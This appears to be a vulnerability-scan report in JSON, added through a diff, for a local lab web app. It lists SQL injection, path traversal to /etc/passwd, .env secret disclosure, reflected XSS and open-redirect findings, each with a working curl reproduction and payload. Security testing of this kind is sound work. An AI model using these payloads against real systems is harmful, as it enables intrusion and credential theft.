@@ -1,0 +1,402 @@
+{
+  "campaign_id": "3636b656-71bd-4270-a005-9d85c8036fb5",
+  "target": "http://127.0.0.1:3000",
+  "generated_at": "2026-09-17T12:17:14.201882+00:00",
+  "summary": {
+    "CRITICAL": 2,
+    "HIGH": 2,
+    "MEDIUM": 1,
+    "LOW": 0,
+    "INFO": 1
+  },
+  "assets": [
+    {
+      "id": "6ef8d6ab-5d73-417a-8e35-3b6294650d2f",
+      "ip": "127.0.0.1",
+      "hostname": "http://127.0.0.1:3000",
+      "ports": [
+        {
+          "port": 3000,
+          "protocol": "tcp",
+          "state": "open",
+          "service": "http",
+          "version": null,
+          "banner": null
+        }
+      ],
+      "endpoints": [
+        {
+          "url": "http://127.0.0.1:3000",
+          "method": "GET",
+          "status_code": 200,
+          "content_type": "text/html",
+          "title": "OWASP Juice Shop / crAPI Lab",
+          "tech_stack": [
+            "Python:3.14.7",
+            "BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2"
+          ],
+          "headers": {},
+          "parameters": [],
+          "forms": []
+        },
+        {
+          "url": "http://127.0.0.1:3000/search",
+          "method": "GET",
+          "status_code": null,
+          "content_type": null,
+          "title": null,
+          "tech_stack": [],
+          "headers": {},
+          "parameters": [
+            "query"
+          ],
+          "forms": [
+            {
+              "action": "http://127.0.0.1:3000/search",
+              "method": "GET",
+              "inputs": [
+                {
+                  "name": "query",
+                  "type": "text",
+                  "value": ""
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "url": "http://127.0.0.1:3000/login",
+          "method": "POST",
+          "status_code": null,
+          "content_type": null,
+          "title": null,
+          "tech_stack": [],
+          "headers": {},
+          "parameters": [
+            "username",
+            "password"
+          ],
+          "forms": [
+            {
+              "action": "http://127.0.0.1:3000/login",
+              "method": "POST",
+              "inputs": [
+                {
+                  "name": "username",
+                  "type": "text",
+                  "value": ""
+                },
+                {
+                  "name": "password",
+                  "type": "password",
+                  "value": ""
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "url": "http://127.0.0.1:3000/view?file=intro.txt",
+          "method": "GET",
+          "status_code": 200,
+          "content_type": "text/plain",
+          "title": null,
+          "tech_stack": [],
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.14.7",
+            "Date": "Thu, 17 Sep 2026 12:16:53 GMT",
+            "Content-Type": "text/plain",
+            "Connection": "close"
+          },
+          "parameters": [
+            "file"
+          ],
+          "forms": []
+        },
+        {
+          "url": "http://127.0.0.1:3000/rest/user/login",
+          "method": "GET",
+          "status_code": 200,
+          "content_type": "application/json",
+          "title": null,
+          "tech_stack": [],
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.14.7",
+            "Date": "Thu, 17 Sep 2026 12:16:53 GMT",
+            "Content-Type": "application/json",
+            "Connection": "close"
+          },
+          "parameters": [],
+          "forms": []
+        },
+        {
+          "url": "http://127.0.0.1:3000/redirect?next=/dashboard",
+          "method": "GET",
+          "status_code": 404,
+          "content_type": "",
+          "title": null,
+          "tech_stack": [],
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.14.7",
+            "Date": "Thu, 17 Sep 2026 12:16:53 GMT",
+            "Connection": "close"
+          },
+          "parameters": [
+            "next"
+          ],
+          "forms": []
+        },
+        {
+          "url": "http://127.0.0.1:3000/api/Feedbacks",
+          "method": "GET",
+          "status_code": 200,
+          "content_type": "text/html",
+          "title": null,
+          "tech_stack": [],
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.14.7",
+            "Date": "Thu, 17 Sep 2026 12:16:53 GMT",
+            "Content-Type": "text/html",
+            "Connection": "close"
+          },
+          "parameters": [],
+          "forms": []
+        }
+      ],
+      "os": null,
+      "cloud_provider": null,
+      "metadata": {},
+      "first_seen": "2026-09-17T12:16:53.694264Z",
+      "last_seen": "2026-09-17T12:16:53.694265Z"
+    }
+  ],
+  "findings": [
+    {
+      "id": "0b3a588e-443b-4664-b40c-9289fd863f2a",
+      "title": "Error-Based SQL Injection in Parameter 'username'",
+      "description": "Active DAST probe provoked database error message 'sqlite3.operationalerror' using SQL quote injection on parameter 'username'.",
+      "severity": "CRITICAL",
+      "target": "http://127.0.0.1:3000/login",
+      "tool": "dast-fuzzer",
+      "cve": null,
+      "cwe": "CWE-89",
+      "cvss_score": 9.3,
+      "mitre_attack_ids": [],
+      "owasp_category": "A03:2021 - Injection",
+      "endpoint": "http://127.0.0.1:3000/login?username=",
+      "code_location": null,
+      "secret_type": null,
+      "reproduction_steps": "curl -s \"http://127.0.0.1:3000/login?username=%27%20OR%20%271%27%3D%271\"",
+      "evidence": "Database syntax error detected: 'sqlite3.operationalerror'",
+      "request_proof": "POST http://127.0.0.1:3000/login HTTP/1.1\n\nusername=' OR '1'='1",
+      "response_proof": "HTTP/1.1 500\n\nInternal Error: sqlite3.OperationalError: unrecognized token: '' OR '1'='1'...",
+      "raw_data": {},
+      "discovered_at": "2026-09-17T12:17:13.959072Z",
+      "verified": true,
+      "verified_valid": true,
+      "false_positive": false
+    },
+    {
+      "id": "c4b34bd2-08f3-4c54-89f8-2e96ee1c4b82",
+      "title": "Path Traversal in Parameter 'file'",
+      "description": "Active DAST probe read arbitrary system files via directory traversal in parameter 'file'.",
+      "severity": "CRITICAL",
+      "target": "http://127.0.0.1:3000/view?file=intro.txt",
+      "tool": "dast-fuzzer",
+      "cve": null,
+      "cwe": "CWE-22",
+      "cvss_score": 8.6,
+      "mitre_attack_ids": [],
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "endpoint": "http://127.0.0.1:3000/view?file=intro.txt?file=",
+      "code_location": null,
+      "secret_type": null,
+      "reproduction_steps": "curl -s \"http://127.0.0.1:3000/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd\"",
+      "evidence": "System file signature 'root:' detected in response body.",
+      "request_proof": "GET http://127.0.0.1:3000/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\nUser-Agent: REVENANT-DAST",
+      "response_proof": "HTTP/1.1 200\n\n; for 16-bit app support\n[extensions]\nroot:x:0:0:root:/root:/bin/bash\n...",
+      "raw_data": {},
+      "discovered_at": "2026-09-17T12:17:14.127319Z",
+      "verified": true,
+      "verified_valid": true,
+      "false_positive": false
+    },
+    {
+      "id": "fad78ace-f104-4ec1-8da3-a358bb5bd490",
+      "title": "Generic Env File Disclosure",
+      "description": "A .env file was discovered containing sensitive information like database credentials and tokens. It should not be publicly accessible.\n",
+      "severity": "HIGH",
+      "target": "http://127.0.0.1:3000",
+      "tool": "nuclei",
+      "cve": null,
+      "cwe": "cwe-552",
+      "cvss_score": 8.3,
+      "mitre_attack_ids": [],
+      "owasp_category": null,
+      "endpoint": "http://127.0.0.1:3000/.env",
+      "code_location": null,
+      "secret_type": null,
+      "reproduction_steps": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://127.0.0.1:3000/.env'",
+      "evidence": "Reproduction:\ncurl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://127.0.0.1:3000/.env'",
+      "request_proof": null,
+      "response_proof": null,
+      "raw_data": {
+        "template": "http\\vulnerabilities\\generic\\generic-env.yaml",
+        "template-url": "https://cloud.projectdiscovery.io/public/generic-env",
+        "template-id": "generic-env",
+        "template-path": "C:\\Users\\gone0\\nuclei-templates\\http\\vulnerabilities\\generic\\generic-env.yaml",
+        "info": {
+          "name": "Generic Env File Disclosure",
+          "author": [
+            "kazet"
+          ],
+          "tags": [
+            "config",
+            "exposure",
+            "env",
+            "vuln"
+          ],
+          "description": "A .env file was discovered containing sensitive information like database credentials and tokens. It should not be publicly accessible.\n",
+          "severity": "high",
+          "metadata": {
+            "max-request": 22
+          },
+          "classification": {
+            "cve-id": null,
+            "cwe-id": [
+              "cwe-552"
+            ],
+            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+            "cvss-score": 8.3
+          }
+        },
+        "type": "http",
+        "host": "127.0.0.1",
+        "port": "3000",
+        "scheme": "http",
+        "url": "http://127.0.0.1:3000",
+        "matched-at": "http://127.0.0.1:3000/.env",
+        "request": "GET /.env HTTP/1.1\r\nHost: 127.0.0.1:3000\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0) Gecko/20100101 Firefox/140.0\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+        "response": "HTTP/1.0 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\nDate: Thu, 17 Sep 2026 12:17:13 GMT\r\nServer: BaseHTTP/0.6 Python/3.14.7\r\n\r\nDB_PASSWORD=supersecret_revenant_lab\nAWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\nJWT_SECRET=insecure_token_key\n",
+        "meta": {
+          "paths": "/.env"
+        },
+        "ip": "127.0.0.1",
+        "timestamp": "2026-09-17T17:47:13.0806591+05:30",
+        "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0) Gecko/20100101 Firefox/140.0' 'http://127.0.0.1:3000/.env'",
+        "matcher-status": true
+      },
+      "discovered_at": "2026-09-17T12:17:13.863679Z",
+      "verified": true,
+      "verified_valid": false,
+      "false_positive": false
+    },
+    {
+      "id": "e5497ad7-31b9-4cdd-bdb2-057d6f18e528",
+      "title": "Reflected Cross-Site Scripting (XSS) in Parameter 'query'",
+      "description": "Active DAST injection identified unescaped reflection of script payload in parameter 'query' on endpoint 'http://127.0.0.1:3000/search'.",
+      "severity": "HIGH",
+      "target": "http://127.0.0.1:3000/search",
+      "tool": "dast-fuzzer",
+      "cve": null,
+      "cwe": "CWE-79",
+      "cvss_score": 7.1,
+      "mitre_attack_ids": [],
+      "owasp_category": "A03:2021 - Injection",
+      "endpoint": "http://127.0.0.1:3000/search?query=",
+      "code_location": null,
+      "secret_type": null,
+      "reproduction_steps": "curl -s \"http://127.0.0.1:3000/search?query=rev%3Cscript%3Ealert%28%27xss_query%27%29%3C/script%3Erev\"",
+      "evidence": "Reflected payload detected in HTTP response body:\nrev<script>alert('xss_query')</script>rev",
+      "request_proof": "GET http://127.0.0.1:3000/search?query=rev%3Cscript%3Ealert%28%27xss_query%27%29%3C%2Fscript%3Erev HTTP/1.1\nUser-Agent: REVENANT-DAST",
+      "response_proof": "HTTP/1.1 200\nContent-Type: text/html; charset=utf-8\n\n...rev<script>alert('xss_query')</script>rev...",
+      "raw_data": {},
+      "discovered_at": "2026-09-17T12:17:13.867653Z",
+      "verified": true,
+      "verified_valid": true,
+      "false_positive": false
+    },
+    {
+      "id": "90cf4f7e-e377-4ae6-b97d-a7919dfecdc9",
+      "title": "Open Redirection in Parameter 'next'",
+      "description": "Active DAST probe confirmed unvalidated redirect to external arbitrary domain via parameter 'next'.",
+      "severity": "MEDIUM",
+      "target": "http://127.0.0.1:3000/redirect?next=/dashboard",
+      "tool": "dast-fuzzer",
+      "cve": null,
+      "cwe": "CWE-601",
+      "cvss_score": 6.1,
+      "mitre_attack_ids": [],
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "endpoint": "http://127.0.0.1:3000/redirect?next=/dashboard?next=",
+      "code_location": null,
+      "secret_type": null,
+      "reproduction_steps": "curl -i -s \"http://127.0.0.1:3000/redirect?next=https%3A%2F%2Frevenant.security.test\"",
+      "evidence": "HTTP 302 Redirect with Location: https://revenant.security.test",
+      "request_proof": "GET http://127.0.0.1:3000/redirect?next=https%3A%2F%2Frevenant.security.test HTTP/1.1\nUser-Agent: REVENANT-DAST",
+      "response_proof": "HTTP/1.1 302 Found\nLocation: https://revenant.security.test",
+      "raw_data": {},
+      "discovered_at": "2026-09-17T12:17:14.165698Z",
+      "verified": true,
+      "verified_valid": true,
+      "false_positive": false
+    },
+    {
+      "id": "6c4da261-bbd6-4327-8e37-77680ddfb85f",
+      "title": "Technologies Detected on http://127.0.0.1:3000",
+      "description": "HTTP probing fingerprinted technologies: Python:3.14.7, BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2",
+      "severity": "INFO",
+      "target": "http://127.0.0.1:3000",
+      "tool": "httpx",
+      "cve": null,
+      "cwe": null,
+      "cvss_score": null,
+      "mitre_attack_ids": [],
+      "owasp_category": null,
+      "endpoint": "http://127.0.0.1:3000",
+      "code_location": null,
+      "secret_type": null,
+      "reproduction_steps": null,
+      "evidence": "Status: 200, Title: 'OWASP Juice Shop / crAPI Lab', Tech: ['Python:3.14.7', 'BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2']",
+      "request_proof": null,
+      "response_proof": null,
+      "raw_data": {
+        "timestamp": "2026-09-17T17:46:53.6617411+05:30",
+        "port": "3000",
+        "url": "http://127.0.0.1:3000",
+        "input": "http://127.0.0.1:3000",
+        "title": "OWASP Juice Shop / crAPI Lab",
+        "scheme": "http",
+        "webserver": "BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2",
+        "content_type": "text/html",
+        "method": "GET",
+        "host": "127.0.0.1",
+        "host_ip": "127.0.0.1",
+        "path": "/",
+        "time": "1.9501ms",
+        "a": [
+          "127.0.0.1"
+        ],
+        "tech": [
+          "Python:3.14.7",
+          "BaseHTTP/0.6 Python/3.14.7 Sanctioned-Lab/1.0 Express/4.18.2"
+        ],
+        "words": 205,
+        "lines": 28,
+        "status_code": 200,
+        "content_length": 917,
+        "failed": false,
+        "knowledgebase": {
+          "pHash": 0
+        }
+      },
+      "discovered_at": "2026-09-17T12:16:53.694243Z",
+      "verified": false,
+      "verified_valid": false,
+      "false_positive": false
+    }
+  ],
+  "metadata": {
+    "iterations": 2
+  }
+}
